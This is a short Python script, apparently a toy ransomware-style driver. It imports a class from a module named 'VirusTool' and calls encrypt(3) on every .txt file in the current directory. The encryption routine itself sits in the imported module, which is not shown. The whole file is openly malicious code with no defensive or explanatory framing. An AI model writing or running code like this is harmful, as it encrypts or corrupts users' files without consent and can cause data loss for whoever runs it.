from VirusTool import Naming
import glob
for files in glob.glob("*.txt"):
    file = Naming(files)
    file.encrypt(3)